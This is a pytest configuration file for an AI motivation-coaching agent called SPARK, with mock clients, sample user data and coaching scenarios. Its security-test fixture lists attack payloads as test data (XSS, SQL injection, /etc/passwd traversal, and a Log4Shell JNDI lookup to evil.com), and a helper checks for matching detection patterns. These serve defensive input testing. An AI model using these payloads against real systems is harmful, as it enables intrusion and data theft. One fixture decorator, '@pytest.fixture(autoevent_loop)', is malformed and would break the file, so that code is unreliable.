"""
Pytest configuration and fixtures for SPARK Motivation Behavior Coach testing.
Provides comprehensive test fixtures for A+ level testing coverage.
"""

import pytest
import asyncio
from datetime import datetime, timedelta
from typing import Dict, Any, List
from unittest.mock import MagicMock, AsyncMock

from agents.motivation_behavior_coach.core import (
    SparkDependencies,
    SparkConfig,
    create_test_dependencies,
    MotivationType,
    StageOfChange,
    BehaviorChangeModel,
    CoachingStyle,
)
from agents.motivation_behavior_coach.services import (
    MotivationSecurityService,
    MotivationDataService,
    MotivationIntegrationService,
    BehavioralDataEntry,
)
from agents.motivation_behavior_coach.skills_manager import SparkSkillsManager


@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def spark_config():
    """Create test configuration for SPARK agent."""
    return SparkConfig(
        agent_id="test_spark_motivation_coach",
        agent_name="Test SPARK Motivation Coach",
        max_response_time=10.0,
        default_timeout=8.0,
        retry_attempts=2,
        retry_delay=0.5,
        min_habit_duration_days=7,
        max_habit_duration_days=30,
        max_concurrent_goals=3,
        strategy_rotation_days=3,
        enable_audit_logging=True,
        data_encryption_enabled=True,
        enable_ai_insights=True,
        motivation_prediction_enabled=True,
        cache_ttl_seconds=300,
        max_cache_size=100,
    )


@pytest.fixture
def mock_gemini_client():
    """Create mock Gemini client for AI testing."""
    mock_client = MagicMock()
    mock_client.generate_content = AsyncMock()

    # Default successful response
    mock_client.generate_content.return_value = {
        "success": True,
        "content": "This is a test AI response for behavioral coaching.",
        "tokens_used": 150,
        "model": "gemini-pro",
    }

    return mock_client


@pytest.fixture
def mock_personality_adapter():
    """Create mock personality adapter."""
    mock_adapter = MagicMock()
    mock_adapter.adapt_response = AsyncMock()

    # Default successful adaptation
    mock_adapter.adapt_response.return_value = {
        "success": True,
        "adapted_message": "Adapted response for testing.",
        "confidence_score": 0.85,
        "program_type": "PRIME",
    }

    return mock_adapter


@pytest.fixture
def mock_supabase_client():
    """Create mock Supabase client."""
    mock_client = MagicMock()
    mock_client.table = MagicMock()
    mock_client.table.return_value = mock_client
    mock_client.insert = MagicMock()
    mock_client.select = MagicMock()
    mock_client.update = MagicMock()
    mock_client.delete = MagicMock()

    # Chain methods for fluent interface
    mock_client.insert.return_value = mock_client
    mock_client.select.return_value = mock_client
    mock_client.update.return_value = mock_client
    mock_client.delete.return_value = mock_client
    mock_client.eq = MagicMock(return_value=mock_client)
    mock_client.execute = MagicMock(return_value={"data": [], "error": None})

    return mock_client


@pytest.fixture
def mock_program_classification_service():
    """Create mock program classification service."""
    mock_service = MagicMock()
    mock_service.classify_user_program = MagicMock()
    mock_service.classify_user_program.return_value = {
        "program_type": "PRIME",
        "confidence_score": 0.9,
        "classification_factors": ["executive_language", "performance_focus"],
    }
    return mock_service


@pytest.fixture
def mock_mcp_toolkit():
    """Create mock MCP toolkit."""
    mock_toolkit = MagicMock()
    mock_toolkit.execute_tool = AsyncMock()
    mock_toolkit.execute_tool.return_value = {
        "success": True,
        "result": "Tool execution successful",
    }
    return mock_toolkit


@pytest.fixture
def mock_infrastructure_adapters():
    """Create mock infrastructure adapters."""
    return {
        "state_manager_adapter": MagicMock(),
        "intent_analyzer_adapter": MagicMock(),
        "a2a_adapter": MagicMock(),
    }


@pytest.fixture
def spark_dependencies(
    mock_gemini_client,
    mock_personality_adapter,
    mock_supabase_client,
    mock_program_classification_service,
    mock_mcp_toolkit,
    mock_infrastructure_adapters,
):
    """Create test dependencies for SPARK agent."""
    return SparkDependencies(
        vertex_ai_client=mock_gemini_client,
        personality_adapter=mock_personality_adapter,
        supabase_client=mock_supabase_client,
        program_classification_service=mock_program_classification_service,
        mcp_toolkit=mock_mcp_toolkit,
        state_manager_adapter=mock_infrastructure_adapters["state_manager_adapter"],
        intent_analyzer_adapter=mock_infrastructure_adapters["intent_analyzer_adapter"],
        a2a_adapter=mock_infrastructure_adapters["a2a_adapter"],
    )


@pytest.fixture
def motivation_security_service():
    """Create motivation security service for testing."""
    return MotivationSecurityService()


@pytest.fixture
def motivation_data_service():
    """Create motivation data service for testing."""
    return MotivationDataService(cache_ttl_seconds=300, max_cache_size=100)


@pytest.fixture
def motivation_integration_service():
    """Create motivation integration service for testing."""
    return MotivationIntegrationService()


@pytest.fixture
def spark_skills_manager(spark_dependencies, spark_config):
    """Create SPARK skills manager for testing."""
    return SparkSkillsManager(dependencies=spark_dependencies, config=spark_config)


@pytest.fixture
def sample_behavioral_data():
    """Create sample behavioral data for testing."""
    return [
        BehavioralDataEntry(
            user_id="test_user_123",
            data_type="motivation_assessment",
            content={"motivation_score": 7.5, "assessment_type": "daily"},
            timestamp=datetime.utcnow() - timedelta(days=1),
        ),
        BehavioralDataEntry(
            user_id="test_user_123",
            data_type="habit_tracking",
            content={"habit_name": "morning_exercise", "completed": True},
            timestamp=datetime.utcnow() - timedelta(days=2),
        ),
        BehavioralDataEntry(
            user_id="test_user_123",
            data_type="goal_progress",
            content={"goal_id": "fitness_goal_1", "progress_percentage": 65.0},
            timestamp=datetime.utcnow() - timedelta(days=3),
        ),
    ]


@pytest.fixture
def sample_user_context():
    """Create sample user context for testing."""
    return {
        "user_id": "test_user_123",
        "program_type": "PRIME",
        "session_id": "test_session_456",
        "conversation_id": "test_conversation_789",
        "user_preferences": {
            "communication_style": "direct",
            "coaching_approach": "goal_oriented",
            "motivation_type": "achievement",
        },
        "current_goals": [
            {
                "id": "fitness_goal_1",
                "title": "Exercise 4 times per week",
                "progress": 65.0,
            }
        ],
        "active_habits": [
            {"name": "morning_exercise", "streak": 12, "consistency_rate": 0.85}
        ],
    }


@pytest.fixture
def sample_coaching_scenarios():
    """Create sample coaching scenarios for testing different skills."""
    return {
        "habit_formation": {
            "message": "I want to build a habit of reading for 30 minutes every day",
            "expected_skill": "habit_formation",
            "context": {"user_id": "test_user", "program_type": "LONGEVITY"},
        },
        "goal_setting": {
            "message": "Help me set a goal to improve my fitness level",
            "expected_skill": "goal_setting",
            "context": {"user_id": "test_user", "program_type": "PRIME"},
        },
        "motivation_boost": {
            "message": "I'm feeling unmotivated and need help getting back on track",
            "expected_skill": "motivation_strategies",
            "context": {"user_id": "test_user", "program_type": "PRIME"},
        },
        "behavior_change": {
            "message": "I need to stop procrastinating and be more productive",
            "expected_skill": "behavior_change",
            "context": {"user_id": "test_user", "program_type": "PRIME"},
        },
        "obstacle_management": {
            "message": "I keep running into obstacles that prevent me from exercising",
            "expected_skill": "obstacle_management",
            "context": {"user_id": "test_user", "program_type": "LONGEVITY"},
        },
    }


@pytest.fixture
def sample_ai_responses():
    """Create sample AI responses for different coaching scenarios."""
    return {
        "habit_formation": {
            "success": True,
            "content": """
            Habit Analysis: The user wants to build a daily reading habit.
            Current Stage: Preparation - ready to start implementing.
            Personalized Plan: Start with 10 minutes daily, same time each day.
            Success Factors: Consistent timing, comfortable reading space, progress tracking.
            Potential Obstacles: Busy schedule, fatigue, distractions.
            Tracking System: Simple daily checkmarks, weekly progress review.
            Reinforcement Strategies: Link to existing routine, reward weekly milestones.
            """,
        },
        "goal_setting": {
            "success": True,
            "content": """
            Goal Clarification: Improve overall fitness and health.
            SMART Analysis: Exercise 4x/week for 45 minutes, track progress monthly.
            Milestone Breakdown: Week 2: 2x/week, Week 4: 3x/week, Week 6: 4x/week.
            Action Plan: Schedule workouts, choose activities, track progress.
            Success Metrics: Frequency, duration, fitness improvements.
            Potential Challenges: Time constraints, motivation dips, plateaus.
            Motivation Anchors: Health, energy, confidence, longevity.
            """,
        },
        "motivation_strategies": {
            "success": True,
            "content": """
            Motivation Assessment: Currently experiencing low motivation phase.
            Root Cause Analysis: Lack of clear progress, overwhelming goals.
            Personalized Strategies: Break goals into smaller wins, celebrate progress.
            Intrinsic Motivators: Connect to values, visualize benefits.
            Environmental Changes: Remove barriers, add visual reminders.
            Daily Practices: Morning intention setting, evening reflection.
            Emergency Toolkit: 5-minute motivation reset, accountability check-in.
            """,
        },
    }


@pytest.fixture
def performance_test_data():
    """Create data for performance testing."""
    return {
        "concurrent_users": 10,
        "requests_per_user": 5,
        "max_response_time_ms": 5000,
        "target_success_rate": 0.95,
        "test_scenarios": [
            "habit_formation",
            "goal_setting",
            "motivation_strategies",
            "behavior_change",
            "obstacle_management",
        ],
    }


@pytest.fixture
def security_test_inputs():
    """Create inputs for security testing."""
    return {
        "malicious_inputs": [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "\x00\x01\x02\x03",
        ],
        "large_inputs": [
            "A" * 50000,  # 50KB input
            "B" * 100000,  # 100KB input
        ],
        "sensitive_data": {
            "user_id": "sensitive_user_123",
            "personal_info": "This contains sensitive personal information",
            "behavioral_data": "Private behavioral patterns and motivations",
        },
    }


@pytest.fixture
def integration_test_config():
    """Create configuration for integration testing."""
    return {
        "external_services": {
            "fitness_tracker": {
                "base_url": "https://api.test-fitness.com",
                "timeout": 5,
            },
            "wellness_platform": {
                "base_url": "https://api.test-wellness.com",
                "timeout": 10,
            },
            "notification_service": {
                "base_url": "https://api.test-notifications.com",
                "timeout": 3,
            },
        },
        "test_scenarios": [
            "service_available",
            "service_slow",
            "service_unavailable",
            "service_error",
            "circuit_breaker_open",
        ],
    }


# Utility functions for testing


def create_test_user_data(user_id: str, data_type: str, **kwargs) -> Dict[str, Any]:
    """Create test user data entry."""
    base_data = {
        "user_id": user_id,
        "data_type": data_type,
        "timestamp": datetime.utcnow().isoformat(),
        "session_id": f"test_session_{user_id}",
    }
    base_data.update(kwargs)
    return base_data


def assert_response_structure(response: Dict[str, Any], required_fields: List[str]):
    """Assert that response has required structure."""
    assert isinstance(response, dict), "Response must be a dictionary"
    for field in required_fields:
        assert field in response, f"Response missing required field: {field}"


def assert_ai_response_quality(response: str, min_length: int = 50):
    """Assert AI response meets quality standards."""
    assert isinstance(response, str), "AI response must be a string"
    assert (
        len(response) >= min_length
    ), f"AI response too short: {len(response)} < {min_length}"
    assert not response.isspace(), "AI response cannot be only whitespace"


def assert_security_compliance(data: Dict[str, Any]):
    """Assert data meets security compliance requirements."""
    # Check for required security fields
    security_fields = ["user_id", "timestamp"]
    for field in security_fields:
        assert field in data, f"Security field missing: {field}"

    # Check data doesn't contain obvious malicious content
    data_str = str(data)
    malicious_patterns = ["<script", "DROP TABLE", "../", "${jndi"]
    for pattern in malicious_patterns:
        assert (
            pattern not in data_str
        ), f"Potential malicious content detected: {pattern}"


# Cleanup fixtures


@pytest.fixture(autoevent_loop)
def cleanup_test_data():
    """Cleanup test data after tests."""
    yield
    # Cleanup would happen here in a real database
    pass


@pytest.fixture(scope="function")
def isolated_test_environment():
    """Provide isolated test environment for each test."""
    # Setup isolated environment
    test_env = {
        "start_time": datetime.utcnow(),
        "test_id": f"test_{int(datetime.utcnow().timestamp())}",
    }

    yield test_env

    # Cleanup after test
    # In a real implementation, this would clean up any test artifacts
    pass
